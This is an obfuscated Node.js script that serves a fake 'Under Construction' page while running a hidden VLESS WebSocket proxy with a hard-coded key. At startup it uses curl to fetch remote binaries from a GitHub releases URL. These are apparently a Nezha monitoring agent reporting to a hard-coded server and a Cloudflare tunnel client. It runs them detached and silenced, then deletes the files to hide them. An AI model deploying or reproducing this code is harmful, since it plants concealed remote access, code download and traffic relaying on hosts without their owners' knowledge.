#!/usr/bin/env node

const _0x4c70=['exit','end','443','catch','now','slice','tmpdir','send','nzv1','chmod','home','N_P','unlink','listen','test','error','writeHead','https://github.com/seav1/dl/releases/download/files','once','cwd','/health','text/plain','writeFile','every','http','cRivpR7ScUwP51hJj7rLw7iCbUE6HmKg','NZ_UUID','text/html','readUInt16BE','trim','Internal\x20Server\x20Error','--tls','PORT','createServer','<!DOCTYPE\x20html><html><head><title>Under\x20Construction</title><style>\x0a\x20\x20body{font-family:Arial,sans-serif;margin:0;padding:0;background:linear-gradient(135deg,#667eea\x200%,#764ba2\x20100%);min-height:100vh;display:flex;align-items:center;justify-content:center}\x0a\x20\x20.container{text-align:center;background:white;padding:60px\x2040px;border-radius:15px;box-shadow:0\x2010px\x2030px\x20rgba(0,0,0,0.2);max-width:500px;margin:20px}\x0a\x20\x20h1{color:#333;font-size:2.5em;margin-bottom:20px;font-weight:300}\x0a\x20\x20p{color:#666;font-size:1.2em;line-height:1.6;margin-bottom:30px}\x0a\x20\x20.icon{font-size:4em;margin-bottom:20px;color:#667eea;font-weight:bold}\x0a\x20\x20.footer{color:#999;font-size:0.9em;margin-top:30px}\x0a\x20\x20</style></head><body><div\x20class=\x22container\x22><div\x20class=\x22icon\x22>[!]</div>\x0a\x20\x20<h1>Website\x20Under\x20Construction</h1><p>We\x27re\x20working\x20hard\x20to\x20bring\x20you\x20something\x20amazing.\x20Please\x20check\x20back\x20soon!</p>\x0a\x20\x20<div\x20class=\x22footer\x22>Thank\x20you\x20for\x20your\x20patience.</div></div></body></html>','listening','filter','&encryption=none&sni=','toString','readyState','-arm','connect','vless://','unref','path','pipe','concat','string','env','message','headers','feefeb96-bfcf-4a9b-aac0-6aac771c1b98','status','N_K','.write_test_','code','</div>\x0a\x20\x20<button\x20class=\x22copy-btn\x22\x20onclick=\x22navigator.clipboard.writeText(\x27','EADDRINUSE','curl','ignore','join','http://','NZ_SERVER','NZ_CLIENT_SECRET','/vl','Not\x20Found','N_S','C_T','</div></div>\x0a\x20\x20<div\x20class=\x22info-item\x22><div\x20class=\x22label\x22>Connection\x20Link:</div><div\x20class=\x22value\x22\x20id=\x22vlessLink\x22>','N_T'];const _0x4d05=function(_0x4c7051,_0x4d05ee){_0x4c7051=_0x4c7051-0x0;let _0x53abd6=_0x4c70[_0x4c7051];return _0x53abd6;};const {exec,spawn}=require('child_process');const {WebSocketServer,createWebSocketStream}=require('ws');const http=require(_0x4d05('0x18'));const {URL}=require('url');const net=require('net');const {join}=require(_0x4d05('0x2c'));const {promises:fs}=require('fs');const os=require('os');const CONFIG={'UUID':(process[_0x4d05('0x30')]['UUID']||_0x4d05('0x33'))['replace'](/-/g,''),'PORT':process['env'][_0x4d05('0x20')]||0xbb8,'N_S':process[_0x4d05('0x30')]['N_S']||'newnz.seav.eu.org','N_P':process['env']['N_P']||_0x4d05('0x2'),'N_K':process[_0x4d05('0x30')][_0x4d05('0x35')]||_0x4d05('0x19'),'NZ_UUID':process[_0x4d05('0x30')][_0x4d05('0x1a')]||'','N_T':process['env'][_0x4d05('0x45')]||_0x4d05('0x1f'),'C_B':process[_0x4d05('0x30')]['C_B']||'www.shopify.com','C_T':process['env'][_0x4d05('0x43')]||'','C_D':process[_0x4d05('0x30')]['C_D']||''};const FILE_NAMES={'nzv1':'worker','cf':'service'};let WORK_DIR;const isPortInUse=_0x338cfc=>new Promise(_0x113ce6=>{const _0x381a52=net['createServer']();_0x381a52['once'](_0x4d05('0xf'),_0x757ddf=>_0x113ce6(_0x757ddf[_0x4d05('0x37')]===_0x4d05('0x39')));_0x381a52['once'](_0x4d05('0x23'),()=>{_0x381a52['close']();_0x113ce6(![]);});_0x381a52[_0x4d05('0xd')](_0x338cfc);});const isProcessRunning=_0xd90605=>new Promise(_0x15b482=>{exec('pgrep\x20-x\x20'+_0xd90605,(_0x34186c,_0x297cfb)=>_0x15b482(!_0x34186c&&_0x297cfb[_0x4d05('0x1d')]()['length']>0x0));});const fileExists=async _0xc8a710=>{try{await fs['access'](_0xc8a710);return!![];}catch{return![];}};const isWritable=async _0xcec46a=>{const _0x367d3a=join(_0xcec46a,_0x4d05('0x36')+Date[_0x4d05('0x4')]());try{await fs[_0x4d05('0x16')](_0x367d3a,_0x4d05('0xe'));await fs[_0x4d05('0xc')](_0x367d3a);return!![];}catch{return![];}};const initWorkDir=async()=>{if(await isWritable(os['tmpdir']())){WORK_DIR=os[_0x4d05('0x6')]();}else{WORK_DIR=process[_0x4d05('0x13')]();}};const vlessLink=()=>_0x4d05('0x2a')+CONFIG['UUID']+'@'+CONFIG['C_B']+':443?type=ws&path='+encodeURIComponent(_0x4d05('0x40'))+'&host='+CONFIG['C_D']+_0x4d05('0x25')+CONFIG['C_D']+'&fp=chrome&security=tls#'+CONFIG['C_D'];const HTML_TEMPLATES={'home':_0x4d05('0x22'),'status':(_0xd0b9a2,_0x27f437)=>'<!DOCTYPE\x20html><html><head><title>Service\x20Status</title><style>\x0a\x20\x20body{font-family:Arial,sans-serif;margin:40px;background-color:#f5f5f5}\x0a\x20\x20.container{max-width:600px;margin:0\x20auto;background:white;padding:30px;border-radius:8px;box-shadow:0\x202px\x2010px\x20rgba(0,0,0,0.1)}\x0a\x20\x20h1{color:#333;text-align:center}\x0a\x20\x20.info-item{margin:20px\x200;padding:15px;background:#f8f9fa;border-radius:5px}\x0a\x20\x20.label{font-weight:bold;color:#555;margin-bottom:10px}\x0a\x20\x20.value{font-family:monospace;background:#e9ecef;padding:10px;border-radius:4px;word-break:break-all}\x0a\x20\x20.copy-btn{background:#007cba;color:white;border:none;padding:8px\x2015px;border-radius:3px;cursor:pointer;margin-top:10px}\x0a\x20\x20.copy-btn:hover{background:#0056b3}\x0a\x20\x20</style></head><body><div\x20class=\x22container\x22><h1>Service\x20Running</h1>\x0a\x20\x20<div\x20class=\x22info-item\x22><div\x20class=\x22label\x22>Port:</div><div\x20class=\x22value\x22>'+_0xd0b9a2+_0x4d05('0x44')+_0x27f437+_0x4d05('0x38')+_0x27f437+'\x27).then(()=>alert(\x27Copied!\x27))\x22>Copy</button></div>\x0a\x20\x20</div></body></html>'};const server=http[_0x4d05('0x21')]((_0x30d725,_0x1331ea)=>{try{const {pathname}=new URL(_0x30d725['url'],_0x4d05('0x3d')+_0x30d725[_0x4d05('0x32')]['host']);if(pathname==='/'){_0x1331ea['writeHead'](0xc8,{'Content-Type':'text/html'});_0x1331ea[_0x4d05('0x1')](HTML_TEMPLATES[_0x4d05('0xa')]);}else if(pathname==='/x'){_0x1331ea['writeHead'](0xc8,{'Content-Type':_0x4d05('0x1b')});_0x1331ea[_0x4d05('0x1')](HTML_TEMPLATES[_0x4d05('0x34')](CONFIG['PORT'],vlessLink()));}else if(pathname===_0x4d05('0x14')){_0x1331ea[_0x4d05('0x10')](0xc8,{'Content-Type':'application/json'});_0x1331ea[_0x4d05('0x1')](JSON['stringify']({'status':'ok','uptime':process['uptime']()}));}else{_0x1331ea[_0x4d05('0x10')](0x194,{'Content-Type':_0x4d05('0x15')});_0x1331ea['end'](_0x4d05('0x41'));}}catch{if(!_0x1331ea['headersSent']){_0x1331ea[_0x4d05('0x10')](0x1f4,{'Content-Type':_0x4d05('0x15')});_0x1331ea[_0x4d05('0x1')](_0x4d05('0x1e'));}}});const wss=new WebSocketServer({'server':server,'path':_0x4d05('0x40')});wss['on']('connection',_0x206d40=>{_0x206d40[_0x4d05('0x12')](_0x4d05('0x31'),_0x29f978=>{const [_0x18f683]=_0x29f978;const _0x59edd9=_0x29f978['slice'](0x1,0x11);if(!_0x59edd9[_0x4d05('0x17')]((_0x883c73,_0x1d18dc)=>_0x883c73===parseInt(CONFIG['UUID']['substr'](_0x1d18dc*0x2,0x2),0x10)))return;let _0x47cffa=_0x29f978[_0x4d05('0x5')](0x11,0x12)['readUInt8']()+0x13;const _0x1106fb=_0x29f978['slice'](_0x47cffa,_0x47cffa+=0x2)['readUInt16BE'](0x0);const _0x19f5ed=_0x29f978[_0x4d05('0x5')](_0x47cffa,_0x47cffa+=0x1)['readUInt8']();let _0x824449;if(_0x19f5ed===0x1){_0x824449=_0x29f978['slice'](_0x47cffa,_0x47cffa+=0x4)['join']('.');}else if(_0x19f5ed===0x2){const _0x256c0c=_0x29f978[_0x4d05('0x5')](_0x47cffa,_0x47cffa+=0x1)['readUInt8']();_0x824449=new TextDecoder()['decode'](_0x29f978[_0x4d05('0x5')](_0x47cffa,_0x47cffa+=_0x256c0c));}else if(_0x19f5ed===0x3){_0x824449=_0x29f978[_0x4d05('0x5')](_0x47cffa,_0x47cffa+=0x10)['reduce']((_0xc434d2,_0x20287a,_0xed4f77,_0x293e31)=>_0xed4f77%0x2?_0xc434d2[_0x4d05('0x2e')](_0x293e31[_0x4d05('0x5')](_0xed4f77-0x1,_0xed4f77+0x1)):_0xc434d2,[])['map'](_0xb44100=>_0xb44100[_0x4d05('0x1c')](0x0)[_0x4d05('0x26')](0x10))[_0x4d05('0x3c')](':');}if(_0x206d40[_0x4d05('0x27')]===_0x206d40['OPEN']){_0x206d40[_0x4d05('0x7')](new Uint8Array([_0x18f683,0x0]));const _0x681da0=createWebSocketStream(_0x206d40)['on'](_0x4d05('0xf'),()=>{});const _0x3ccfeb=net[_0x4d05('0x29')]({'host':_0x824449,'port':_0x1106fb},function(){this['write'](_0x29f978['slice'](_0x47cffa));_0x681da0[_0x4d05('0x2d')](this)[_0x4d05('0x2d')](_0x681da0);});_0x3ccfeb['on']('error',()=>{});}});});async function downloadAndRun(_0x501544,_0x17fb1b,_0x45a439,_0x8393c8){if(!_0x501544)return;const _0xf67002=join(WORK_DIR,FILE_NAMES[_0x45a439]);if(await isProcessRunning(FILE_NAMES[_0x45a439]))return;if(await fileExists(_0xf67002)){await fs['chmod'](_0xf67002,0x1ed)[_0x4d05('0x3')](()=>{});spawnProcess(_0xf67002,_0x17fb1b,_0x8393c8);return;}return new Promise(_0x1e5378=>{spawn(_0x4d05('0x3a'),['-s','-L','-o',_0xf67002,_0x501544],{'stdio':'ignore'})['on']('close',async _0x1e116a=>{if(_0x1e116a===0x0){await fs[_0x4d05('0x9')](_0xf67002,0x1ed)[_0x4d05('0x3')](()=>{});spawnProcess(_0xf67002,_0x17fb1b,_0x8393c8);}_0x1e5378();})['on']('error',()=>fs[_0x4d05('0xc')](_0xf67002)['catch'](()=>{}));});}function spawnProcess(_0x4761d6,_0x56dc31,_0xe0dec1){const _0x404dc6=spawn(_0x4761d6,_0x56dc31['split']('\x20')[_0x4d05('0x24')](_0x537e8f=>_0x537e8f),{'stdio':_0x4d05('0x3b'),'detached':!![],'env':_0xe0dec1||process['env']});_0x404dc6[_0x4d05('0x2b')]();_0x404dc6['on']('spawn',()=>setTimeout(()=>fs['unlink'](_0x4761d6)['catch'](()=>{}),0x3e8));}const baseUrl=_0x4d05('0x11');const archUrl=_0x172003=>process['arch']==='arm64'?_0x172003+_0x4d05('0x28'):_0x172003;(async()=>{await initWorkDir();if(await isPortInUse(CONFIG[_0x4d05('0x20')]))process[_0x4d05('0x0')](0x1);server[_0x4d05('0xd')](CONFIG[_0x4d05('0x20')]);if(CONFIG[_0x4d05('0x42')]&&CONFIG['N_K']){const _0x40772b={...process['env']};_0x40772b[_0x4d05('0x3e')]=CONFIG['N_S']+':'+CONFIG[_0x4d05('0xb')];_0x40772b[_0x4d05('0x3f')]=CONFIG[_0x4d05('0x35')];if(CONFIG['NZ_UUID']){_0x40772b[_0x4d05('0x1a')]=CONFIG[_0x4d05('0x1a')];}if(CONFIG['N_T']===_0x4d05('0x1f')||typeof CONFIG[_0x4d05('0x45')]===_0x4d05('0x2f')&&CONFIG[_0x4d05('0x45')]['includes']('--tls')){_0x40772b['NZ_TLS']='true';}await downloadAndRun(archUrl(baseUrl+'/nzv1'),'',_0x4d05('0x8'),_0x40772b);}await downloadAndRun(archUrl(baseUrl+'/cf'),'tunnel\x20--edge-ip-version\x20auto\x20--protocol\x20http2\x20--no-autoupdate\x20run\x20--token\x20'+CONFIG['C_T'],'cf');})()[_0x4d05('0x3')](()=>process[_0x4d05('0x0')](0x1));
